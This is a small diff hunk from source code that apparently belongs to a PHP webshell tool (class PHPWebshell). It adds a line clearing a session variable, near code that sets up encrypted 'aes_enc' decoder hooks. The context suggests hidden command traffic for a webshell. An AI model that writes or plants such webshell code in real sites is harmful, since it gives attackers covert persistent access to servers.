@@ -801,6 +801,7 @@ class PHPWebshell(PHPSessionInterface):
                         0,
                         substr($data, 0, 16)
                     );
+                    unset($_SESSION[SESSION_NAME]);
                 }
                 if(extension_loaded('openssl')) {
                     array_push($decoder_hooks, "aes_enc");
